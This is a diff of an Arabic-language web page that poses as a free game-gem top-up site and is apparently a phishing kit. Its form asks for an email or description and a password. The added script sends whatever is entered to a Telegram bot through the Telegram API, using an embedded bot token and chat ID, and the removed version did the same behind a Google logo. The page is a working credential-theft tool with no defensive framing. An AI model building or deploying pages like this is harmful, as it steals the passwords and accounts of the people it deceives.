@@ -7,138 +7,129 @@
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background: url('photo.gif') no-repeat center center fixed;
-      background-size: cover;
+      background: linear-gradient(135deg, black, purple);
+      font-family: 'Arial', sans-serif;
     }
 
-    .header {
-      background: url('photo.gif') no-repeat center center;
+    header {
+      background-image: url('photo.gif');
       background-size: cover;
       height: 200px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
     }
 
     .title {
-      font-size: 28px;
+      text-align: center;
       color: red;
       font-weight: bold;
-      animation: pulse 2s infinite, glow 2s ease-in-out infinite alternate;
-      margin: 20px;
-      text-align: center;
+      font-size: 32px;
+      margin: 20px 0;
+      animation: pulse 2s infinite;
     }
 
     @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
+      0%, 100% { text-shadow: 0 0 10px red; }
+      50% { text-shadow: 0 0 25px red; }
     }
 
-    @keyframes glow {
-      from {
-        text-shadow: 0 0 5px red, 0 0 10px red;
-      }
-      to {
-        text-shadow: 0 0 20px red, 0 0 30px red;
-      }
-    }
-
-    .boxes {
+    .grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 15px;
+      gap: 20px;
       padding: 20px;
-      justify-items: center;
     }
 
     .box {
-      width: 200px;
-      height: 200px;
-      background: url('photo.png') center center;
-      background-size: cover;
-      filter: blur(3px);
-      border-radius: 15px;
-    }
-
-    .form-container {
-      background: white;
-      width: 300px;
-      margin: 30px auto;
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
-      position: relative;
-    }
-
-    .google-logo {
-      width: 40px;
-      position: absolute;
-      top: -20px;
-      left: 10px;
-    }
-
-    input, button {
       width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      font-size: 16px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
+      height: 200px;
+      background-image: url('girl.gif');
+      background-size: cover;
+      filter: blur(2px);
+      border-radius: 20px;
     }
 
-    button {
-      background-color: #4285f4;
+    .form-box {
+      margin: 30px auto;
+      background-color: orange;
+      border: 4px dotted white;
+      width: 80%;
+      max-width: 500px;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px white;
+    }
+
+    .form-box h3 {
+      text-align: center;
+      margin-bottom: 20px;
       color: white;
-      cursor: pointer;
-      transition: 0.3s;
     }
 
-    button:hover {
-      background-color: #3367d6;
+    .form-box input {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+    }
+
+    .form-box button {
+      width: 100%;
+      padding: 15px;
+      background-color: purple;
+      color: white;
+      border: none;
+      font-weight: bold;
+      font-size: 18px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .form-box button:hover {
+      background-color: darkviolet;
     }
   </style>
 </head>
 <body>
 
-  <div class="header"></div>
+<header></header>
 
-  <div class="title">شحن جواهر</div>
+<div class="title">شحن جواهر</div>
 
-  <div class="boxes">
-    <div class="box"></div>
-    <div class="box"></div>
-    <div class="box"></div>
-    <div class="box"></div>
-    <div class="box"></div>
-  </div>
+<div class="grid">
+  <div class="box"></div>
+  <div class="box"></div>
+  <div class="box"></div>
+  <div class="box"></div>
+  <div class="box"></div>
+</div>
 
-  <div class="form-container">
-    <img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo">
-    <input type="text" id="desc" placeholder="اكتب وصفًا">
-    <input type="password" id="pass" placeholder="كلمة السر">
-    <button onclick="sendToBot()">إرسال</button>
-  </div>
+<div class="form-box">
+  <h3>📩 أرسل وصفك</h3>
+  <input type="text" id="desc" placeholder="بريد الكتروني" <input type="password" id="pass" placeholder="كلمة السر">
+  <button onclick="sendToBot()">إرسال</button>
+</div>
 
-  <script>
-    async function sendToBot() {
-      const token = "توكن_البوت";
-      const chat_id = "ايدى_التليجرام";
-      const description = document.getElementById("desc").value;
-      const password = document.getElementById("pass").value;
+<script>
+  function sendToBot() {
+    const desc = document.getElementById('desc').value;
+    const pass = document.getElementById('pass').value;
 
-      const message = `📥 وصف: ${description}\n🔑 كلمة السر: ${password}`;
+    const message = `موقع لشحن جواهر 💎 فري فري: ${desc}\nكلمة السر: ${pass}`;
 
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text: message })
-      });
-      alert("تم الإرسال بنجاح ✅");
-    }
-  </script>
+    const token = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";  //
+    const chatId = "7664410054";   //
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    }).then(res => alert("تم الإرسال")).catch(err => alert("فشل الإرسال"));
+  }
+</script>
 
 </body>
 </html>
